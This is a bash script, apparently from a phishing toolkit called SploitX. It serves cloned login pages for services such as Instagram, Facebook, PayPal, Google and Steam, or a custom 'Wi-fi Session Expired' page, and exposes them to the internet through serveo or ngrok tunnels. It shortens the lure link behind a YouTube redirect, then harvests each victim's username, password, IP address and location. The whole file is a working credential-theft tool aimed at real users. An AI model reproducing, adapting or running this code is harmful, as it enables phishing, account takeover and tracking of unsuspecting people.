# Coded by: MrHacker-X
# Github: https://github.com/MrHacker-X/SploitX.git/
# colour set
g="\033[1;92m"
w="\033[1;97m"
r="\033[1;97m"

clear
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "php is not installed."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "curl is not installed."; exit 1; }

}

menu() {

echo -e "$g[\033[1;97m01$g] Instagram      [\033[1;97m17$g] IGFollowers"
sleep 0.01
echo -e "$g[\033[1;97m02$g] Facebook       [\033[1;97m18$g] eBay"
sleep 0.01
echo -e "$g[\033[1;97m03$g] Snapchat       [\033[1;97m19$g] Pinterest"
sleep 0.01
echo -e "$g[\033[1;97m04$g] Twitter        [\033[1;97m20$g] CryptoCurrency"
sleep 0.01
echo -e "$g[\033[1;97m05$g] Github         [\033[1;97m21$g] Verizon"
sleep 0.01
echo -e "$g[\033[1;97m06$g] Google         [\033[1;97m22$g] DropBox"
sleep 0.01
echo -e "$g[\033[1;97m07$g] Spotify        [\033[1;97m23$g] Adobe ID"
sleep 0.01
echo -e "$g[\033[1;97m08$g] Netflix        [\033[1;97m24$g] Shopify"
sleep 0.01
echo -e "$g[\033[1;97m09$g] PayPal         [\033[1;97m25$g] Messenger"
sleep 0.01
echo -e "$g[\033[1;97m10$g] Origin         [\033[1;97m26$g] GitLab"
sleep 0.01
echo -e "$g[\033[1;97m11$g] Steam          [\033[1;97m27$g] Twitch"
sleep 0.01
echo -e "$g[\033[1;97m12$g] Yahoo          [\033[1;97m28$g] MySpace"
sleep 0.01
echo -e "$g[\033[1;97m13$g] Linkedin       [\033[1;97m29$g] Badoo"
sleep 0.01
echo -e "$g[\033[1;97m14$g] Protonmail     [\033[1;97m30$g] VK"
sleep 0.01
echo -e "$g[\033[1;97m15$g] Wordpress      [\033[1;97m31$g] Yandex"
sleep 0.01
echo -e "$g[\033[1;97m16$g] Microsoft      [\033[1;97m32$g] devianART"
sleep 0.01
echo -e "          $g[\033[1;97m33$g] Custom"
sleep 0.01
echo -e "          $g[\033[1;97m99$g] Exit"
sleep 0.01
read -p $'\n\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="facebook"
start1
elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="paypal"
start1

elif [[ $option == 10 ]]; then
server="origin"
start1

elif [[ $option == 11 ]]; then
server="steam"
start1

elif [[ $option == 12 ]]; then
server="yahoo"
start1

elif [[ $option == 13 ]]; then
server="linkedin"
start1

elif [[ $option == 14 ]]; then
server="protonmail"
start1

elif [[ $option == 15 ]]; then
server="wordpress"
start1

elif [[ $option == 16 ]]; then
server="microsoft"
start1

elif [[ $option == 17 ]]; then
server="instafollowers"
start1

elif [[ $option == 18 ]]; then
server="shopping"
start1

elif [[ $option == 19 ]]; then
server="pinterest"
start1

elif [[ $option == 20 ]]; then
server="cryptocurrency"
start1

elif [[ $option == 21 ]]; then
server="verizon"
start1

elif [[ $option == 22 ]]; then
server="dropbox"
start1

elif [[ $option == 23 ]]; then
server="adobe"
start1

elif [[ $option == 24 ]]; then
server="shopify"
start1

elif [[ $option == 25 ]]; then
server="messenger"
start1

elif [[ $option == 26 ]]; then
server="gitlab"
start1

elif [[ $option == 27 ]]; then
server="twitch"
start1

elif [[ $option == 28 ]]; then
server="myspace"
start1

elif [[ $option == 29 ]]; then
server="badoo"
start1

elif [[ $option == 30 ]]; then
server="vk"
start1

elif [[ $option == 31 ]]; then
server="yandex"
start1

elif [[ $option == 32 ]]; then
server="devianart"
start1

elif [[ $option == 33 ]]; then
server="create"
createpage
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;92m [\033[1;97m#\033[1;92m] Enter valid option \e[0m\n"
sleep 1
clear
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}

banner() {

echo -e "$g███████ ██████  ██       ██████  ██ ████████$r ██   ██"
sleep 0.01
echo -e "$g██      ██   ██ ██      ██    ██ ██    ██    $r ██ ██"
sleep 0.01
echo -e "$g███████ ██████  ██      ██    ██ ██    ██   $r   ███"
sleep 0.01
echo -e "$g     ██ ██      ██      ██    ██ ██    ██   $r  ██ ██"
sleep 0.01
echo -e "$g███████ ██      ███████  ██████  ██    ██  $r  ██   ██"
sleep 0.01
echo -e "$g        ..:: | Created by$w MrHacker-X $g| ::..  \n"
sleep 0.01

}

createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
echo -e "\033[1;92m[\033[1;97m#\033[1;92m] Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[\033[1;97m#\033[1;92m] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

##
serverx() {
printf "\e[1;92m[\e[\033[1;97m#\033[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH is not installed."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


##

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip but is not installed."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "wget but is not installed."; exit 1; }
printf "\e[1;92m[\033[1;97m#\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;91m[!] \033[1;92mDownload error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;91m[!] \033[1;92mDownload error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\033[1;97m#\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\033[1;97m#\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m#\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
echo -e "\033[1;92m[\033[1;97m01\033[1;92m] Serveo.net"
echo -e "\033[1;92m[\033[1;97m02\033[1;92m] Ngrok.io (\033[1;97mhotspot required\033[1;92m)"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
printf "\e[1;92m [\033[1;97m#\033[1;92m] Enter valid option\e[0m\n"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m#\e[0m\e[1;92m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;92m[\e[0m#\e[1;92m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
done 

}
banner
dependencies
menu

